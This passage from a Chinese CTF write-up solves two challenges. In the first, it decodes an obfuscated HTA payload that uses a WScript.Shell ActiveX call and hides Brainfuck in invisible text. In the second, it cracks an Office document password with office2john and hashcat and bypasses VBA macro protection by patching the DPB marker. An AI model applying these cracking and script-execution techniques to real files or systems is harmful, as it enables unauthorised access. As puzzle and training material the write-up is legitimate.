class="hljs-number">1</span>jb<span class="hljs-number">206</span>YXNtLnYzIj<span class="hljs-number">4</span>KICAgICAgICA<span class="hljs-number">8</span>ZHBpQXdhcmVuZXNzIHhtbG<span class="hljs-number">5</span>zPSJodHRwOi<span class="hljs-number">8</span>vc<span class="hljs-number">2</span>NoZW<span class="hljs-number">1</span>hcy<span class="hljs-number">5</span>taWNyb<span class="hljs-number">3</span>NvZnQuY<span class="hljs-number">29</span>tL<span class="hljs-number">1</span>NNSS<span class="hljs-number">8</span>yMDE<span class="hljs-number">2</span>L<span class="hljs-number">1</span>dpbmRvd<span class="hljs-number">3</span>NTZXR<span class="hljs-number">0</span>aW<span class="hljs-number">5</span>ncyI+RG<span class="hljs-number">8</span>geW<span class="hljs-number">91</span>IGtub<span class="hljs-number">3</span>cganM<span class="hljs-number">8</span>L<span class="hljs-number">2</span>RwaUF<span class="hljs-number">3</span>YXJlbmVzcz<span class="hljs-number">4</span>KPHNjcmlwdCBsYW<span class="hljs-number">5</span>ndWFnZT<span class="hljs-number">0</span>iamF<span class="hljs-number">2</span>YXNjcmlwdCI+ZG<span class="hljs-number">9</span>jdW<span class="hljs-number">1</span>lbnQud<span class="hljs-number">3</span>JpdGUodW<span class="hljs-number">5</span>lc<span class="hljs-number">2</span>NhcGUoJyUzQ<span class="hljs-number">2</span>h<span class="hljs-number">0</span>bWwlM<span class="hljs-number">0</span>UlMEElM<span class="hljs-number">0</span>Nib<span class="hljs-number">2</span>R<span class="hljs-number">5</span>JTNFJTBBJTBBJTNDJTIxRE<span class="hljs-number">9</span>DVFlQRSUyMGh<span class="hljs-number">0</span>bWwlM<span class="hljs-number">0</span>UlMEElM<span class="hljs-number">0</span>NodG<span class="hljs-number">1</span>sJTNFJTBBJTNDaGVhZCUzRSUwQSUyMCUyMCUyMCUyMCUzQ<span class="hljs-number">3</span>RpdGxlJTNFRG<span class="hljs-number">8</span>lMjBZb<span class="hljs-number">3</span>UlMjBLbm<span class="hljs-number">93</span>JTIwanMlM<span class="hljs-number">0</span>MlMkZ<span class="hljs-number">0</span>aXRsZSUzRSUwQSUzQ<span class="hljs-number">0</span>hUQSUzQUFQUExJQ<span class="hljs-number">0</span>FUSU<span class="hljs-number">9</span>OJTBBJTIwJTIwQVBQTElDQVRJT<span class="hljs-number">05</span>OQU<span class="hljs-number">1</span>FJTNEJTIyRG<span class="hljs-number">8</span>lMjBZb<span class="hljs-number">3</span>UlMjBLbm<span class="hljs-number">93</span>JTIwanMlMjIlMEElMjAlMjBJRCUzRCUyMkluY<span class="hljs-number">2</span>VwdGlvbiUyMiUwQSUyMCUyMFZFUlNJT<span class="hljs-number">04</span>lM<span class="hljs-number">0</span>QlMjIxLjAlMjIlMEElMjAlMjBTQ<span class="hljs-number">1</span>JPTEwlM<span class="hljs-number">0</span>QlMjJubyUyMiUyRiUzRSUwQSUyMCUwQSUzQ<span class="hljs-number">3</span>N<span class="hljs-number">0</span>eWxlJTIwdHlwZSUzRCUyMnRleHQlMkZjc<span class="hljs-number">3</span>MlMjIlM<span class="hljs-number">0</span>UlMEElM<span class="hljs-number">0</span>MlMkZoZWFkJTNFJTBBJTIwJTIwJTIwJTIwJTNDZGl<span class="hljs-number">2</span>JTIwaWQlM<span class="hljs-number">0</span>QlMjJmZWF<span class="hljs-number">0</span>dXJlJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDZGl<span class="hljs-number">2</span>JTIwaWQlM<span class="hljs-number">0</span>QlMjJjb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>JTBBJTA<span class="hljs-number">5</span>JTA<span class="hljs-number">5</span>JTA<span class="hljs-number">5</span>JTA<span class="hljs-number">5</span>JTNDJTJGc<span class="hljs-number">3</span>R<span class="hljs-number">5</span>bGUlM<span class="hljs-number">0</span>UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM<span class="hljs-number">0</span>NoMSUyMGlkJTNEJTIydW<span class="hljs-number">5</span>hdmFpbGFibGUlMjIlMjBjbGFzcyUzRCUyMmxvYWRpbmclMjIlM<span class="hljs-number">0</span>VCdWlsZGluZyUyMGpzLi<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>lM<span class="hljs-number">0</span>MlMkZoMSUzRSUwQSUwOSUwOSUwOSUwOSUzQ<span class="hljs-number">3</span>NjcmlwdCUyMHR<span class="hljs-number">5</span>cGUlM<span class="hljs-number">0</span>QlMjJ<span class="hljs-number">0</span>ZXh<span class="hljs-number">0</span>JTJGamF<span class="hljs-number">2</span>YXNjcmlwdCUyMiUyMGxhbmd<span class="hljs-number">1</span>YWdlJTNEJTIyamF<span class="hljs-number">2</span>YXNjcmlwdCUyMiUzRSUwQSUwOSUwOSUwOSUwOSUwOWZ<span class="hljs-number">1</span>bmN<span class="hljs-number">0</span>aW<span class="hljs-number">9</span>uJTIwUnVuRmlsZSUyOCUyOSUyMCU<span class="hljs-number">3</span>QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHZhciUyMFdzaFNoZWxsJTIwJTNEJTIwbmV<span class="hljs-number">3</span>JTIwQWN<span class="hljs-number">0</span>aXZlWE<span class="hljs-number">9</span>iamVjdCUyOCUyMldTY<span class="hljs-number">3</span>JpcHQuU<span class="hljs-number">2</span>hlbGwlMjIlMjklM<span class="hljs-number">0</span>IlMEElMDklMDklMDklMDklMDlXc<span class="hljs-number">2</span>hTaGVsbC<span class="hljs-number">5</span>SdW<span class="hljs-number">4</span>lMjglMjJub<span class="hljs-number">3</span>RlcGFkJTIwJTI<span class="hljs-number">1</span>d<span class="hljs-number">2</span>luZGlyJTI<span class="hljs-number">1</span>JTJGRGVza<span class="hljs-number">3</span>RvcCUyRmpzLnR<span class="hljs-number">4</span>dCUyMiUyQyUyMDElMkMlMjBmYWxzZSUyOSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyRiolMjB<span class="hljs-number">2</span>YXIlMjBvRXhlYyUyMCUzRCUyMFdzaFNoZWxsLkV<span class="hljs-number">4</span>ZWMlMjglMjJub<span class="hljs-number">3</span>RlcGFkJTIyJTI<span class="hljs-number">5</span>JTNCJTIwKiUy<br><br>base<span class="hljs-number">64</span> decode:<br>&lt;?xml version<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span> encoding<span class="hljs-operator">=</span><span class="hljs-string">&quot;UTF-8&quot;</span> standalone<span class="hljs-operator">=</span><span class="hljs-string">&quot;yes&quot;</span>?&gt;<br>&lt;assembly xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span> manifestVersion<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span>&gt;<br>&lt;trustInfo xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;<br>            &lt;requestedExecutionLevel level<span class="hljs-operator">=</span><span class="hljs-string">&quot;asInvoker&quot;</span> uiAccess<span class="hljs-operator">=</span><span class="hljs-string">&quot;false&quot;</span>/&gt;<br>&lt;application xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;<br>        &lt;dpiAwareness xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;http://schemas.microsoft.com/SMI/2016/WindowsSettings&quot;</span>&gt;Do you know js&lt;/dpiAwareness&gt;<br>&lt;script language<span class="hljs-operator">=</span><span class="hljs-string">&quot;javascript&quot;</span>&gt;document.write(unescape(&#x27;<span class="hljs-variable">%3</span>Chtml<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Cbody<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%21</span>DOCTYPE<span class="hljs-variable">%20</span>html<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Chtml<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Chead<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Ctitle<span class="hljs-variable">%3</span>EDo<span class="hljs-variable">%20</span>You<span class="hljs-variable">%20</span>Know<span class="hljs-variable">%20</span>js<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Ftitle<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>CHTA<span class="hljs-variable">%3</span>AAPPLICATION<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>APPLICATIONNAME<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>Do<span class="hljs-variable">%20</span>You<span class="hljs-variable">%20</span>Know<span class="hljs-variable">%20</span>js<span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>ID<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>Inception<span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>VERSION<span class="hljs-variable">%3</span>D<span class="hljs-variable">%221</span>.<span class="hljs-number">0</span><span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>SCROLL<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>no<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Cstyle<span class="hljs-variable">%20</span><span class="hljs-keyword">type</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>text<span class="hljs-variable">%2</span>Fcss<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fhead<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Cdiv<span class="hljs-variable">%20</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>feature<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Cdiv<span class="hljs-variable">%20</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>content<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fstyle<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Ch<span class="hljs-number">1</span><span class="hljs-variable">%20</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>unavailable<span class="hljs-variable">%22</span><span class="hljs-variable">%20</span>class<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>loading<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>EBuilding<span class="hljs-variable">%20</span>js.....<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fh<span class="hljs-number">1</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%3</span>Cscript<span class="hljs-variable">%20</span><span class="hljs-keyword">type</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>text<span class="hljs-variable">%2</span>Fjavascript<span class="hljs-variable">%22</span><span class="hljs-variable">%20</span>language<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>javascript<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span>function<span class="hljs-variable">%20</span>RunFile<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>var<span class="hljs-variable">%20</span>WshShell<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span>new<span class="hljs-variable">%20</span>ActiveXObject<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>WScript.Shell<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span>WshShell.Run<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>notepad<span class="hljs-variable">%20</span><span class="hljs-variable">%25</span>windir<span class="hljs-variable">%25</span><span class="hljs-variable">%2</span>FDesktop<span class="hljs-variable">%2</span>Fjs.txt<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%201</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%20</span><span class="hljs-keyword">false</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>F*<span class="hljs-variable">%20</span>var<span class="hljs-variable">%20</span>oExec<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span>WshShell.Exec<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>notepad<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%20</span>*<span class="hljs-variable">%2</span><br></code></pre></td></tr></table></figure><p>可以看到有一个script标签。我们把其他数据段也提出来，进行解码，然后只关注script标签部分。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-built_in">unescape</span>(<span class="hljs-string">&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;</span>));</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>中间的代码提取出来。打开浏览器的开发模式，在控制台里面把中间代码敲上。</p><p>界面出现了一些元素。翻找页面元素。发现了一个p标签颜色是白色的，由于背景也是白的，所以在我们这算是不可见。打开看看。里面是brainfuck的代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js">+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- <br>-.-.- --.++ ++++.<br>+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- <br>&gt;---&lt; ]&gt;--- ---.+ ++++. -----<br>.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.<br>&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+<br> +++++ .---- -.++. ++.+.<br>--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- <br>.+.-. ---.+ ++.+. -.+++<br>+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---<br>-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ <br>.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.<br>+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ <br>.---- .+.++ ++.-- --.++<br>++.-. ----. +.-.+ ++++. <br>&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;<br></code></pre></td></tr></table></figure><p>解码得到：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D<br></code></pre></td></tr></table></figure><p>十六进制转换为字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-number">0x446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</span>))<br><br><span class="hljs-comment"># Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;</span><br></code></pre></td></tr></table></figure><h2 id="easyword"><a class="markdownIt-Anchor" href="#easyword"></a> EasyWord</h2><p>用hashcat对password.docm进行爆破。</p><p>首先提取文件的hash。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/CTF/Dest0g]<br>└─$ office2john password.docm <br>password.docm:$office$*2010*100000*128*16*d135d71212d659473f2b5fb4bf46d78e*e0a8853d6d0c42cafd62c82dda2fbc6e*d0889853485e2aeb49c06a1d3d691fc81ffb42a35f97c83d0ed5c646066f4ab1<br></code></pre></td></tr></table></figure><p>得到输出去掉前面的文件名写入到文件里。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10600</span> | PDF <span class="hljs-number">1</span>.<span class="hljs-number">7</span> Level <span class="hljs-number">3</span> (Acrobat <span class="hljs-number">9</span>)                      | Documents<br><span class="hljs-attribute">10700</span> | PDF <span class="hljs-number">1</span>.<span class="hljs-number">7</span> Level <span class="hljs-number">8</span> (Acrobat <span class="hljs-number">10</span> - <span class="hljs-number">11</span>)                | Documents<br> <span class="hljs-attribute">9400</span> | MS Office <span class="hljs-number">2007</span>                                   | Documents<br> <span class="hljs-attribute">9500</span> | MS Office <span class="hljs-number">2010</span>                                   | Documents<br> <span class="hljs-attribute">9600</span> | MS Office <span class="hljs-number">2013</span>                                   | Documents<br> <span class="hljs-attribute">9700</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">0</span>/$<span class="hljs-number">1</span>, MD5 + RC4               | Documents<br> <span class="hljs-attribute">9710</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">0</span>/$<span class="hljs-number">1</span>, MD5 + RC4, collider #<span class="hljs-number">1</span>  | Documents<br> <span class="hljs-attribute">9720</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">0</span>/$<span class="hljs-number">1</span>, MD5 + RC4, collider #<span class="hljs-number">2</span>  | Documents<br> <span class="hljs-attribute">9800</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">3</span>/$<span class="hljs-number">4</span>, SHA1 + RC4              | Documents<br> <span class="hljs-attribute">9810</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">3</span>, SHA1 + RC4, collider #<span class="hljs-number">1</span>    | Documents<br> <span class="hljs-attribute">9820</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">3</span>, SHA1 + RC4, collider #<span class="hljs-number">2</span>    | Documents<br><br></code></pre></td></tr></table></figure><p>我们得到hash头是office2010，type为9500。</p><p>hint中提示密码为：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">The length <span class="hljs-keyword">of</span> docm &#x27;s password <span class="hljs-keyword">is</span> 6<br>The Regular Expression <span class="hljs-keyword">of</span> the password <span class="hljs-keyword">is</span>:<br><span class="hljs-comment">[a-z]</span> <span class="hljs-comment">[a-z]</span> q <span class="hljs-comment">[a-z]</span> b <span class="hljs-comment">[a-z]</span><br></code></pre></td></tr></table></figure><p>采用掩码爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/CTF/Dest0g]<br>└─$ hashcat docxhash -a 3 -m 9500 ?l?lq?lb?l<br>...<br>...<br>$office$*2010*100000*128*16*d135d71212d659473f2b5fb4bf46d78e*e0a8853d6d0c42cafd62c82dda2fbc6e*d0889853485e2aeb49c06a1d3d691fc81ffb42a35f97c83d0ed5c646066f4ab1:ulqsbt<br>                                                 <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Name........: MS Office 2010<br>Hash.Target......: $office$*2010*100000*128*16*d135d71212d659473f2b5fb...6f4ab1<br>Time.Started.....: Mon May 23 14:56:52 2022 (4 mins, 53 secs)<br>Time.Estimated...: Mon May 23 15:01:45 2022 (0 secs)<br>Guess.Mask.......: ?l?lq?lb?l [6]<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:     1439 H/s (13.85ms) @ Accel:1024 Loops:512 Thr:1 Vec:8</span><br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 421888/456976 (92.32%)<br>Rejected.........: 0/421888 (0.00%)<br>Restore.Point....: 12288/17576 (69.91%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:24-25 Iteration:0-1</span><br>Candidates.<span class="hljs-comment">#1....: udqabt -&gt; uiqebx</span><br><br><span class="hljs-comment"># ulqsbt</span><br></code></pre></td></tr></table></figure><p>得到密码为ulqsbt。但是我的word不知道为什么打不开这个文档。没辙了，我也懒得下其他office。</p><p>后面发现是WindowsDefender给我拦了…</p><p>打开文件，运行宏，弹出一个对话框。要求输入对应的口令。但是咱不知道口令。看看VBA的代码吧。结果VBA的代码是加密的，服了。52上面找到了如何破解。</p><p>首先另存为这个docm文件。将新保存的文件用zip打开。找到word/vbaProject.bin。取出来用二进制查看器打开。查找文件中的&quot;DPB&quot;字符串。将其修改为“DPX”</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span 